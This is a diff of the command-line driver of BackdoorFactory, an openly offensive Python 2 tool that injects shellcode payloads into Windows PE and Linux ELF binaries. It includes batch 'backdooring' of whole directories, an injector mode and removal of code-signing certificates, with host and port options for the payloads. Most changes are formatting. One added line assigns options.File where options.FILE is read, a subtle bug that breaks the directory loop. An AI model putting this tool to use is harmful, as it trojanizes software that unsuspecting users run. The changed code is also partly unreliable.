@@ -1,18 +1,18 @@
 #!/usr/bin/env python
 '''
-    BackdoorFactory (BDF) v2 - Tertium Quid 
+    BackdoorFactory (BDF) v2 - Tertium Quid
 
     Many thanks to Ryan O'Neill --ryan 'at' codeslum <d ot> org--
-    Without him, I would still be trying to do stupid things 
+    Without him, I would still be trying to do stupid things
     with the elf format.
-    Also thanks to Silvio Cesare with his 1998 paper 
+    Also thanks to Silvio Cesare with his 1998 paper
     (http://vxheaven.org/lib/vsc01.html) which these ELF patching
     techniques are based on.
 
     Special thanks to Travis Morrow for poking holes in my ideas.
 
     Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
-   
+
     Copyright (C) 2013,2014, Joshua Pitts
 
     License:   GPLv3
@@ -55,7 +55,7 @@ def signal_handler(signal, frame):
 class bdfMain():
 
     version = """\
-         2.2.0
+         2.2.1
          """
 
     author = """\
@@ -129,7 +129,7 @@ class bdfMain():
     parser.add_option("-f", "--file", dest="FILE", action="store",
                       type="string",
                       help="File to backdoor")
-    parser.add_option("-s", "--shell", default="show", dest="SHELL", 
+    parser.add_option("-s", "--shell", default="show", dest="SHELL",
                       action="store", type="string",
                       help="Payloads that are available for use."
                       " Use 'show' to see payloads."
@@ -224,7 +224,7 @@ class bdfMain():
                       help="For debug information output.")
     parser.add_option("-T", "--image-type", dest="IMAGE_TYPE", default="ALL",
                       type='string',
-                      action="store", help="ALL, x32, or x64 type binaries only. Default=ALL")
+                      action="store", help="ALL, x86, or x64 type binaries only. Default=ALL")
     parser.add_option("-Z", "--zero_cert", dest="ZERO_CERT", default=True, action="store_false",
                       help="Allows for the overwriting of the pointer to the PE certificate table"
                       " effectively removing the certificate from the binary for all intents"
@@ -237,7 +237,7 @@ class bdfMain():
                       )
     parser.add_option("-L", "--patch_dll", dest="PATCH_DLL", default=True, action="store_false",
                       help="Use this setting if you DON'T want to patch DLLs. Patches by default."
-                     )
+                      )
 
     (options, args) = parser.parse_args()
 
@@ -252,8 +252,6 @@ class bdfMain():
         else:
             'Only support ELF and PE file formats'
             return None
-        
-    
 
     if options.NO_BANNER is False:
         print choice(menu)
@@ -271,29 +269,29 @@ class bdfMain():
                 is_supported = basicDiscovery(options.FILE)
                 if is_supported is "PE":
                     supported_file = pebin(options.FILE,
-                                            options.OUTPUT,
-                                            options.SHELL,
-                                            options.NSECTION,
-                                            options.DISK_OFFSET,
-                                            options.ADD_SECTION,
-                                            options.CAVE_JUMPING,
-                                            options.PORT,
-                                            options.HOST,
-                                            options.SUPPLIED_SHELLCODE,
-                                            options.INJECTOR,
-                                            options.CHANGE_ACCESS,
-                                            options.VERBOSE,
-                                            options.SUPPORT_CHECK,
-                                            options.SHELL_LEN,
-                                            options.FIND_CAVES,
-                                            options.SUFFIX,
-                                            options.DELETE_ORIGINAL,
-                                            options.CAVE_MINER,
-                                            options.IMAGE_TYPE,
-                                            options.ZERO_CERT,
-                                            options.CHECK_ADMIN,
-                                            options.PATCH_DLL
-                                            )
+                                           options.OUTPUT,
+                                           options.SHELL,
+                                           options.NSECTION,
+                                           options.DISK_OFFSET,
+                                           options.ADD_SECTION,
+                                           options.CAVE_JUMPING,
+                                           options.PORT,
+                                           options.HOST,
+                                           options.SUPPLIED_SHELLCODE,
+                                           options.INJECTOR,
+                                           options.CHANGE_ACCESS,
+                                           options.VERBOSE,
+                                           options.SUPPORT_CHECK,
+                                           options.SHELL_LEN,
+                                           options.FIND_CAVES,
+                                           options.SUFFIX,
+                                           options.DELETE_ORIGINAL,
+                                           options.CAVE_MINER,
+                                           options.IMAGE_TYPE,
+                                           options.ZERO_CERT,
+                                           options.CHECK_ADMIN,
+                                           options.PATCH_DLL
+                                           )
                 elif is_supported is "ELF":
                     supported_file = elfbin(options.FILE,
                                             options.OUTPUT,
@@ -306,7 +304,7 @@ class bdfMain():
                                             options.SUPPLIED_SHELLCODE,
                                             options.IMAGE_TYPE
                                             )
-                                        
+
                 if options.SUPPORT_CHECK is True:
                     if os.path.isfile(options.FILE):
                         is_supported = False
@@ -324,7 +322,7 @@ class bdfMain():
                 #    if supported_file.flItms['runas_admin'] is True:
                 #        print "%s must be run as admin." % options.FILE
                 print "*" * 50
-        
+
         if options.SUPPORT_CHECK is True:
             sys.exit()
 
@@ -339,40 +337,40 @@ class bdfMain():
             for item in dirlisting:
                 #print item
                 print "*" * 50
-                options.FILE = options.DIR + '/' + item
+                options.File = options.DIR + '/' + item
                 if os.path.isdir(options.FILE) is True:
                     print "Directory found, continuing"
                     continue
-                
+
                 print ("backdooring file %s" % item)
                 result = None
                 is_supported = basicDiscovery(options.FILE)
                 try:
                     if is_supported is "PE":
                         supported_file = pebin(options.FILE,
-                                                options.OUTPUT,
-                                                options.SHELL,
-                                                options.NSECTION,
-                                                options.DISK_OFFSET,
-                                                options.ADD_SECTION,
-                                                options.CAVE_JUMPING,
-                                                options.PORT,
-                                                options.HOST,
-                                                options.SUPPLIED_SHELLCODE,
-                                                options.INJECTOR,
-                                                options.CHANGE_ACCESS,
-                                                options.VERBOSE,
-                                                options.SUPPORT_CHECK,
-                                                options.SHELL_LEN,
-                                                options.FIND_CAVES,
-                                                options.SUFFIX,
-                                                options.DELETE_ORIGINAL,
-                                                options.CAVE_MINER,
-                                                options.IMAGE_TYPE,
-                                                options.ZERO_CERT,
-                                                options.CHECK_ADMIN,
-                                                options.PATCH_DLL
-                                                )
+                                               options.OUTPUT,
+                                               options.SHELL,
+                                               options.NSECTION,
+                                               options.DISK_OFFSET,
+                                               options.ADD_SECTION,
+                                               options.CAVE_JUMPING,
+                                               options.PORT,
+                                               options.HOST,
+                                               options.SUPPLIED_SHELLCODE,
+                                               options.INJECTOR,
+                                               options.CHANGE_ACCESS,
+                                               options.VERBOSE,
+                                               options.SUPPORT_CHECK,
+                                               options.SHELL_LEN,
+                                               options.FIND_CAVES,
+                                               options.SUFFIX,
+                                               options.DELETE_ORIGINAL,
+                                               options.CAVE_MINER,
+                                               options.IMAGE_TYPE,
+                                               options.ZERO_CERT,
+                                               options.CHECK_ADMIN,
+                                               options.PATCH_DLL
+                                               )
                         supported_file.OUTPUT = None
                         supported_file.output_options()
                         result = supported_file.patch_pe()
@@ -391,7 +389,7 @@ class bdfMain():
                         supported_file.OUTPUT = None
                         supported_file.output_options()
                         result = supported_file.patch_elf()
-                    
+
                     if result is None:
                         print 'Not Supported. Continuing'
                         continue
@@ -399,36 +397,36 @@ class bdfMain():
                         print ("[*] File {0} is in backdoored "
                                "directory".format(supported_file.FILE))
                 except Exception as e:
-                    print "DIR ERROR",str(e)
+                    print "DIR ERROR", str(e)
         else:
             print("Goodbye")
 
         sys.exit()
-    
+
     if options.INJECTOR is True:
         supported_file = pebin(options.FILE,
-                                options.OUTPUT,
-                                options.SHELL,
-                                options.NSECTION,
-                                options.DISK_OFFSET,
-                                options.ADD_SECTION,
-                                options.CAVE_JUMPING,
-                                options.PORT,
-                                options.HOST,
-                                options.SUPPLIED_SHELLCODE,
-                                options.INJECTOR,
-                                options.CHANGE_ACCESS,
-                                options.VERBOSE,
-                                options.SUPPORT_CHECK,
-                                options.SHELL_LEN,
-                                options.FIND_CAVES,
-                                options.SUFFIX,
-                                options.DELETE_ORIGINAL,
-                                options.IMAGE_TYPE,
-                                options.ZERO_CERT,
-                                options.CHECK_ADMIN,
-                                options.PATCH_DLL
-                                )
+                               options.OUTPUT,
+                               options.SHELL,
+                               options.NSECTION,
+                               options.DISK_OFFSET,
+                               options.ADD_SECTION,
+                               options.CAVE_JUMPING,
+                               options.PORT,
+                               options.HOST,
+                               options.SUPPLIED_SHELLCODE,
+                               options.INJECTOR,
+                               options.CHANGE_ACCESS,
+                               options.VERBOSE,
+                               options.SUPPORT_CHECK,
+                               options.SHELL_LEN,
+                               options.FIND_CAVES,
+                               options.SUFFIX,
+                               options.DELETE_ORIGINAL,
+                               options.IMAGE_TYPE,
+                               options.ZERO_CERT,
+                               options.CHECK_ADMIN,
+                               options.PATCH_DLL
+                               )
         supported_file.injector()
         sys.exit()
 
@@ -440,29 +438,29 @@ class bdfMain():
     is_supported = basicDiscovery(options.FILE)
     if is_supported is "PE":
         supported_file = pebin(options.FILE,
-                                options.OUTPUT,
-                                options.SHELL,
-                                options.NSECTION,
-                                options.DISK_OFFSET,
-                                options.ADD_SECTION,
-                                options.CAVE_JUMPING,
-                                options.PORT,
-                                options.HOST,
-                                options.SUPPLIED_SHELLCODE,
-                                options.INJECTOR,
-                                options.CHANGE_ACCESS,
-                                options.VERBOSE,
-                                options.SUPPORT_CHECK,
-                                options.SHELL_LEN,
-                                options.FIND_CAVES,
-                                options.SUFFIX,
-                                options.DELETE_ORIGINAL,
-                                options.CAVE_MINER,
-                                options.IMAGE_TYPE,
-                                options.ZERO_CERT,
-                                options.CHECK_ADMIN,
-                                options.PATCH_DLL
-                                )
+                               options.OUTPUT,
+                               options.SHELL,
+                               options.NSECTION,
+                               options.DISK_OFFSET,
+                               options.ADD_SECTION,
+                               options.CAVE_JUMPING,
+                               options.PORT,
+                               options.HOST,
+                               options.SUPPLIED_SHELLCODE,
+                               options.INJECTOR,
+                               options.CHANGE_ACCESS,
+                               options.VERBOSE,
+                               options.SUPPORT_CHECK,
+                               options.SHELL_LEN,
+                               options.FIND_CAVES,
+                               options.SUFFIX,
+                               options.DELETE_ORIGINAL,
+                               options.CAVE_MINER,
+                               options.IMAGE_TYPE,
+                               options.ZERO_CERT,
+                               options.CHECK_ADMIN,
+                               options.PATCH_DLL
+                               )
     elif is_supported is "ELF":
         supported_file = elfbin(options.FILE,
                                 options.OUTPUT,
@@ -475,7 +473,9 @@ class bdfMain():
                                 options.SUPPLIED_SHELLCODE,
                                 options.IMAGE_TYPE
                                 )
-
+    else:
+        print "Not supported."
+        sys.exit()
     result = supported_file.run_this()
     if result is True:
         print "File {0} is in the 'backdoored' directory".format(supported_file.FILE)
